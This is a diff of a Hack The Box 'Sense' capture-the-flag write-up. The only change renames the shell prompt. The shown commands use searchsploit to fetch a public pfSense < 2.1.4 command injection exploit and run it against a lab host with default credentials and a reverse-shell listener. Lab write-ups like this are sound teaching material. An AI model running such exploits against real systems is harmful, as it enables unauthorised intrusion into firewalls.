@@ -92,14 +92,14 @@ As we are already know from `/changelog.txt`. there is a serious vuln on the fir
 
 after some googling, I found exploit this version. [link](https://www.exploit-db.com/exploits/43560). so let use searchsploit to get the exploit script and lunch our attack
 ```
-kali@kali:~/HTB/sense$ searchsploit pfSense 2.1.4
+bibo318@parrot:~/HTB/sense$ searchsploit pfSense 2.1.4
 --------------------------------------------------------------- ---------------------------------
  Exploit Title                                                 |  Path
 --------------------------------------------------------------- ---------------------------------
 pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection | php/webapps/43560.py
 --------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
-kali@kali:~/HTB/sense$ searchsploit -m php/webapps/43560.py
+bibo318@parrot:~/HTB/sense$ searchsploit -m php/webapps/43560.py
   Exploit: pfSense < 2.1.4 - 'status_rrd_graph_img.php' Command Injection
       URL: https://www.exploit-db.com/exploits/43560
      Path: /usr/share/exploitdb/exploits/php/webapps/43560.py
@@ -109,7 +109,7 @@ Copied to: /home/kali/HTB/sense/43560.py
 ```
 let check the exploit script
 ```
-kali@kali:~/HTB/sense$ python3 43560.py -h
+bibo318@parrot:~/HTB/sense$ python3 43560.py -h
 usage: 43560.py [-h] [--rhost RHOST] [--lhost LHOST] [--lport LPORT] [--username USERNAME]
                 [--password PASSWORD]
 
@@ -123,7 +123,7 @@ optional arguments:
 ```
 okey let run it
 ```
-kali@kali:~/HTB/sense$ python3 43560.py --rhost 10.10.10.60 --lhost tun0 --lport 6969 --username rohit --password pfsense
+bibo318@parrot:~/HTB/sense$ python3 43560.py --rhost 10.10.10.60 --lhost tun0 --lport 6969 --username rohit --password pfsense
 CSRF token obtained
 Running exploit...
 Exploit completed
